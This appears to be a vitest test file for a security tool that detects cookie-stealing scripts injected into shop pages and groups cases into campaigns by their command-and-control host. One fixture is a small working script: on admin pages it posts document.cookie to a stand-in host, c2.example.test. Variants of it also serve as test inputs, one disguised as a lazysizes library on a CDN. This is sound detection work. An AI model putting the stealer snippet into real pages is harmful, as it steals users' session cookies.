import { describe, expect, it } from "vitest";
import { clusterCampaigns } from "../graph/cluster";
import { buildEvidenceGraph } from "../graph/link";
import { makeDataset } from "../graph/testkit";
import { extractPageKit } from "./pagekit";
import { detectStealerKit, foreignScriptCandidates } from "./stealerKit";

const TROJAN = `(function(){ if (location.pathname.includes("/admin")) { fetch("https://c2.example.test/k", {method:"POST", headers:{"X-Cookie": document.cookie}}); } })();`;
const LAZYSIZES = `!function(e,t){var a=t(e,e.document);e.lazySizes=a;"object"==typeof module&&module.exports&&(module.exports=a)}(window,function(e,t){"use strict";var a=t.documentElement;function n(){} if(e.location.pathname==="/"){n()} fetch("/api/img?src="+encodeURIComponent(a.lang));return {init:n}});`;

describe("stealer kit (B-333)", () => {
  it("path check plus cookie sent to a foreign host gives the signals and the C2 host", () => {
    const r = detectStealerKit(TROJAN, "https://shop.example/");
    expect(r?.c2Hosts).toEqual(["c2.example.test"]);
    expect(r?.signals).toEqual(["exfil_cookie", "path_check", "request_header"]);
  });
  it("a genuine lazysizes snippet gives nothing", () => {
    expect(detectStealerKit(LAZYSIZES, "https://shop.example/")).toBeNull();
  });
  it("a path check alone or a cookie sent to the own domain gives nothing", () => {
    expect(detectStealerKit(`if (location.pathname.includes("/admin")) { x(); }`, "https://shop.example/")).toBeNull();
    expect(detectStealerKit(`if (location.pathname.includes("/admin")) fetch("https://api.shop.example/k",{headers:{"X-C": document.cookie}})`, "https://shop.example/")).toBeNull();
    expect(detectStealerKit(`fetch("https://c2.example.test/k",{headers:{"X-C": document.cookie}})`, "https://shop.example/")).toBeNull();
  });
  it("the page kit carries it from an inline script and from a fetched library", () => {
    const html = `<html><body><script>${TROJAN}</script></body></html>`;
    expect(extractPageKit(html, "https://shop.example/").stealerKit?.c2Hosts).toEqual(["c2.example.test"]);
    const plain = extractPageKit("<html><body>x</body></html>", "https://shop.example/", { foreignScripts: [{ url: "https://cdn.jsdelivr.net/gh/u/r/lazysizes.min.js", body: TROJAN }] });
    expect(plain.stealerKit?.signals).toContain("path_check");
  });
  it("only code-hosting and free static hosts are candidates", () => {
    const a = (url: string) => ({ kind: "js", url, host: new URL(url).host });
    expect(
      foreignScriptCandidates([a("https://cdn.jsdelivr.net/gh/u/r/x.js"), a("https://cdn.jsdelivr.net/npm/x.js"), a("https://u.github.io/x.js"), a("https://www.google.example/x.js")], "https://shop.example/"),
    ).toEqual(["https://cdn.jsdelivr.net/gh/u/r/x.js", "https://u.github.io/x.js"]);
  });
  it("two cases with the same C2 are linked by a c2_host node, a case with another C2 is not", () => {
    const kit = (js: string) => ({ stealerKit: extractPageKit(`<script>${js}</script>`, "https://x.example/").stealerKit });
    const res = clusterCampaigns(
      buildEvidenceGraph(
        makeDataset([
          { id: "a", url: "https://alpha.example/", kit: kit(TROJAN) },
          { id: "b", url: "https://beta.test/", kit: kit(TROJAN) },
          { id: "c", url: "https://gamma.test/", kit: kit(TROJAN.replace("c2.example.test", "other.example.test")) },
        ]),
        { textMethod: "none" },
      ),
    );
    expect(res.graph.nodes.find((n) => n.type === "c2_host" && n.key === "c2.example.test")).toBeTruthy();
    expect(res.campaigns.assignments["a"]).toBe(res.campaigns.assignments["b"]);
    expect(res.campaigns.assignments["a"]).not.toBe(res.campaigns.assignments["c"]);
  });
});
